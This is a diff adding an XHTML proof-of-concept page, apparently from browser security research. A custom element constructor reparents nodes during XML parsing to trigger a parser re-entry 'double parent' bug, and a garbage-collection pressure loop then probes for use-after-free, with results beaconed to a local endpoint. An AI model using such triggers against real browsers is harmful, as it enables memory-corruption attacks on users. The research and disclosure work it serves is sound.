@@ -1,0 +1,159 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head><title>V412-inner</title></head>
+<body>
+<div id="sink"></div>
+<script><![CDATA[
+// p412-inner: Define custom element, then create instances that trigger
+// the XMLDocumentParser re-entry bug.
+//
+// Key insight: We CANNOT use the custom element in the same XHTML parse
+// that defines it (the <script> runs mid-parse, but later elements in this
+// document would need the CE registered BEFORE parse started... unless
+// the parser upgrades elements lazily).
+//
+// Actually -- XMLDocumentParser processes elements one by one via SAX
+// callbacks. When it hits <script>, it runs the script (which registers
+// the CE). Then when it hits subsequent elements, startElementNs checks
+// the CE registry and finds our definition. The constructor runs during
+// the reaction stack drain, BEFORE parserAppendChild.
+//
+// So: define CE in this script, then place <stolen-elem> tags AFTER this
+// script in the XHTML. The parser will process them with the CE registered.
+//
+// PROBLEM: XHTML is pre-parsed (the whole document must be well-formed XML).
+// We can't add elements after the script because they'd need to already
+// exist in the XML. But we CAN use document.write... no, XHTML forbids it.
+//
+// SOLUTION: Use innerHTML or insertAdjacentHTML on an element that's
+// already in the tree. When we do innerHTML='<stolen-elem/>', the HTML
+// parser (not XML) creates the element and triggers the CE constructor.
+// BUT: this goes through the HTML parser, not XMLDocumentParser.
+//
+// REAL SOLUTION: Create a second XHTML document dynamically using:
+// - XMLHttpRequest to fetch another XHTML file
+// - Set its response as innerHTML (won't work, HTML parser)
+// - Use document.implementation.createDocument (no window)
+//
+// ACTUAL APPROACH: Just put the custom element tags in this very document
+// BELOW the script tag. The XMLDocumentParser SAX callback for script
+// runs this JS (registering the CE), then continues parsing. When it hits
+// the <stolen-elem> below, it sees the registered CE and runs the constructor.
+
+var BQ = 0;
+function B(t) {
+  try {
+    var x = new XMLHttpRequest();
+    x.open('POST', '/beacon/V412-I-' + t + '?t=' + Date.now() + '&q=' + (BQ++), false);
+    x.send('');
+  } catch(e) {}
+}
+
+B('BOOT');
+
+if (typeof customElements === 'undefined') {
+  B('NO-CE');
+} else {
+  B('CE-OK');
+
+  var sink = document.getElementById('sink');
+  var ctorCount = 0;
+  var reparentCount = 0;
+
+  class StolenElement extends HTMLElement {
+    constructor() {
+      super();
+      ctorCount++;
+      B('CTOR-' + ctorCount);
+      try {
+        sink.appendChild(this);
+        reparentCount++;
+        B('REPARENT-' + reparentCount + '-PARENT-' + (this.parentNode ? this.parentNode.id || this.parentNode.nodeName : 'NULL'));
+      } catch(e) {
+        B('REPARENT-ERR-' + (e.message || '').substring(0, 60));
+      }
+    }
+  }
+
+  customElements.define('stolen-elem', StolenElement);
+  B('CE-DEFINED');
+}
+
+B('SCRIPT-DONE');
+]]></script>
+
+<!-- These elements are parsed AFTER the script above registers the CE.
+     XMLDocumentParser::startElementNs will see willConstructCustomElement=true
+     and drain the reaction stack, running our constructor.
+
+     After constructor: parser calls parserAppendChild(newElement) WITHOUT
+     checking if constructor moved the element. If constructor called
+     sink.appendChild(this), the element already has a parent.
+     parserAppendChild will try to add it again -> double parent. -->
+
+<stolen-elem id="s1">first</stolen-elem>
+<stolen-elem id="s2">second</stolen-elem>
+<stolen-elem id="s3">third</stolen-elem>
+
+<script><![CDATA[
+// Post-parse verification
+B('POST-PARSE');
+
+var s1 = document.getElementById('s1');
+var s2 = document.getElementById('s2');
+var s3 = document.getElementById('s3');
+
+B('CTORS-TOTAL-' + ctorCount);
+B('REPARENTS-TOTAL-' + reparentCount);
+
+// Check if elements ended up in sink (from constructor)
+var sinkChildren = sink.childNodes.length;
+B('SINK-CHILDREN-' + sinkChildren);
+
+// Check body children -- if double-parent, elements are in both
+var body = document.body || document.documentElement;
+B('BODY-CHILDREN-' + body.childNodes.length);
+
+// Check each element's parent
+if (s1) B('S1-PARENT-' + (s1.parentNode ? s1.parentNode.id || s1.parentNode.nodeName : 'NULL'));
+if (s2) B('S2-PARENT-' + (s2.parentNode ? s2.parentNode.id || s2.parentNode.nodeName : 'NULL'));
+if (s3) B('S3-PARENT-' + (s3.parentNode ? s3.parentNode.id || s3.parentNode.nodeName : 'NULL'));
+
+// Check for double-parent: element in sink AND in body's tree
+for (var i = 0; i < sink.childNodes.length; i++) {
+  var child = sink.childNodes[i];
+  if (child.id) {
+    // Check if this same node is also a child of body
+    var bodyChild = null;
+    for (var j = 0; j < body.childNodes.length; j++) {
+      if (body.childNodes[j] === child) {
+        bodyChild = true;
+        break;
+      }
+    }
+    // Deep search in body tree (not just direct children)
+    var found = body.contains(child) && sink.contains(child);
+    B('CHECK-' + child.id + '-IN-SINK-Y-IN-BODY-' + (body.contains(child) ? 'Y' : 'N'));
+  }
+}
+
+// Memory layout probe: try to trigger GC and see if freed nodes cause crash
+B('GC-FORCE');
+try {
+  for (var i = 0; i < 50000; i++) {
+    var tmp = {a: new Array(100)};
+  }
+  B('GC-DONE');
+} catch(e) {
+  B('GC-ERR-' + (e.message || '').substring(0, 40));
+}
+
+// Final check after GC
+if (s1) B('S1-POST-GC-' + (s1.parentNode ? 'ALIVE' : 'ORPHAN'));
+if (s2) B('S2-POST-GC-' + (s2.parentNode ? 'ALIVE' : 'ORPHAN'));
+
+B('COMPLETE');
+]]></script>
+
+</body>
+</html>
